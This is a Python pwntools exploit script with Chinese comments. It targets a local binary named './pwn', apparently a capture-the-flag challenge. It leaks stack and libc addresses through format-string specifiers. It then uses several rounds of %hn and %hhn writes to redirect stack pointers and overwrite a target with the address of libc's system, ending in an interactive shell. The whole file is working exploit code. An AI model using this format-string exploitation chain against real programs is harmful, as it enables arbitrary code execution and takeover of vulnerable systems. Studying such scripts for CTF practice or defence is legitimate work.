#!/usr/bin/env python3
from pwn import *

# ============================================================
# 0. 初始化
# ============================================================

io = process('./pwn')
libc = ELF('./libc.so.6')

# 调试时取消注释
# context.log_level = 'debug'
# gdb.attach(io)

BUF_SIZE = 0x1000

# 原脚本中使用的参数偏移和地址
FMT_HN_OFFSET = 9
FMT_HHn_OFFSET = 43

#PRINTF_GOT = 0x404000


# ============================================================
# 1. 辅助函数
# ============================================================

def send_padded_fmt(fmt: str):
    """
    发送格式字符串，并填充到 0x1000 字节。

    原脚本使用 NUL 字节终止格式字符串，
    再将剩余缓冲区填充为 NUL。
    """
    payload = fmt.encode() + b'\x00'
    io.send(payload.ljust(BUF_SIZE, b'\x00'))
    #io.send(payload)

def leak_addresses():
    """
    利用 %6$p 和 %7$p 泄露栈地址与 libc 地址。
    """
    io.send(b'%6$p%7$p')

    io.recvuntil(b'0x')
    stack = int(io.recv(12), 16)

    io.recvuntil(b'0x')
    libc_leak = int(io.recv(12), 16)

    # libc_start_call_main 的已知偏移
    libc_base = libc_leak - 0x2A1CA

    log.success(f'stack leak = {stack:#x}')
    log.success(f'libc leak  = {libc_leak:#x}')
    log.success(f'libc base  = {libc_base:#x}')

    return stack, libc_base


# ============================================================
# 2. 第一轮：构造并使用栈上的写入目标
# ============================================================

def first_write_stage(space_stack: int):
    """
    保留原脚本的第一组格式化字符串写入序列。

    %9$hn  ：向第 9 个参数所指向的位置写入 2 字节计数值。
    %43$hhn：向第 43 个参数所指向的位置写入 1 字节计数值。

    注意：这组写入依赖实际的栈布局，不能只根据变量名
    推断最终修改的是哪个指针或地址。
    """

    # 写入第一个半字
    send_padded_fmt(f'%{space_stack & 0xffff}c%9$hn')

    # 将当前输出字符数写入第 43 个参数所指向的位置
    send_padded_fmt('%43$hhn')

    # 写入下一个半字
    send_padded_fmt(f'%{(space_stack & 0xffff) + 1}c%9$hn')
    send_padded_fmt('%64c%43$hhn')

    # 写入第三个半字
    send_padded_fmt(f'%{(space_stack & 0xffff) + 2}c%9$hn')
    send_padded_fmt('%64c%43$hhn')


# ============================================================
# 3. 第二轮：调整另一组栈上写入目标
# ============================================================

def second_write_stage(space_stack: int):
    """
    保留原脚本第二组写入序列。

    与第一轮的区别：
    第一次使用 %c，使输出计数增加 1，
    而不是直接使用 %43$hhn。
    """

    send_padded_fmt(f'%{space_stack & 0xffff}c%9$hn')
    send_padded_fmt('%c%43$hhn')

    send_padded_fmt(f'%{(space_stack & 0xffff) + 1}c%9$hn')
    send_padded_fmt('%64c%43$hhn')

    send_padded_fmt(f'%{(space_stack & 0xffff) + 2}c%9$hn')
    send_padded_fmt('%64c%43$hhn')


# ============================================================
# 4. 最终阶段：计算 system 地址并进行最后的写入
# ============================================================

def final_write_stage(system_addr: int):
    """
    保留原脚本最后的格式字符串。

    %21$hhn：写入输出计数的低 8 位。
    %22$hn ：写入输出计数的低 16 位。

    第 21、22 个参数指向哪里，需要通过 GDB 确认。
    """
    low_byte = system_addr & 0xff
    next_two_bytes = (system_addr >> 8) & 0xffff

    payload = (
        f'%{low_byte}c%21$hhn'
        f'%{next_two_bytes - low_byte}c%22$hn'
    )

    # 原脚本在这里直接发送，没有补齐到 0x1000
    io.send(payload.encode())


# ============================================================
# 5. 主流程
# ============================================================

# 阶段 A：地址泄露
stack, libc_base = leak_addresses()

# 计算原脚本使用的栈上目标地址
# - 0x28 = space_stack - stack = (*rbp = 0x7fffffffe1f0) - (rbp + 0x0f = 0x7fffffffe1c8)
space_stack = stack - 0x28

log.info(f'initial write target = {space_stack:#x}')

# 阶段 B：第一组写入
first_write_stage(space_stack)

# 计算 system 在当前 libc 中的地址
system_addr = libc_base + libc.sym.system
log.success(f'system = {system_addr:#x}')

# 阶段 C：调整目标地址并执行第二组写入
space_stack += 8
second_write_stage(space_stack)

# 阶段 D：最终写入
final_write_stage(system_addr)

# 阶段 E：进入交互模式
io.interactive()
